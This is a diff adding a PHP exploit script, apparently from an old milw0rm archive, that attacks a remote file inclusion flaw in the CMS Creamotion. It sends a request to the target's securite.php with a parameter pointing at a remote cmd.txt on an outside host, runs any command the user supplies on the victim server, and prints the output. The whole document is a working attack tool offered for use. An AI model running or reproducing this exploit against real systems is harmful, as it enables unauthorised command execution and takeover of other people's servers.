@@ -1,0 +1,67 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+/*
+/*      CMS Creamotion - Remote File include
+/*  This exploit should allow you to execute commands
+/*            By : HACKERS PAL
+/*             WwW.SoQoR.NeT
+*/
+print_r('
+/**********************************************/
+/*     CMS Creamotion Command Execution       */
+/*    by HACKERS PAL <security@soqor.net>     */
+/*         site: http://www.soqor.net         */');
+if ($argc<3) {
+	print_r('
+/* --                                         */
+/* Usage: php '.$argv[0].' host
+/* Example:                                   */
+/*    php '.$argv[0].' http://localhost/ id
+/**********************************************/
+');
+	die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+
+$url=$argv[1];
+$cmd=$argv[2];
+$exploit="/_administration/securite.php?cfg[document_uri]=http://members.lycos.co.uk/soqor10/cmd.txt?";
+$page=$url.$exploit;
+
+Function get_page($url)
+{
+
+	if(function_exists("file_get_contents"))
+	{
+
+		$contents = file_get_contents($url);
+	}
+	else
+	{
+		$fp=fopen("$url","r");
+		while($line=fread($fp,1024))
+		{
+			$contents=$contents.$line;
+		}
+
+
+	}
+	return $contents;
+}
+$npage    = get_page($page);
+
+
+if(eregi("Cannot execute a blank command",$npage))
+{
+	$pagecmd=$page."&cmd=$cmd";
+	Die("\n[+] Exploit Is Working\n[+] Result For CMD : ".get_page($pagecmd)."\n[+] See The Vulnerabiliy article for more informations\n/*        Visit us : WwW.SoQoR.NeT            */\n/**********************************************/");
+}
+Else
+{
+	Die("\n[-] Exploit Failed\n/*        Visit us : WwW.SoQoR.NeT            */\n/**********************************************/");
+}
+#WwW.SoQoR.NeT
+?>
+
+# milw0rm.com [2007-10-06]
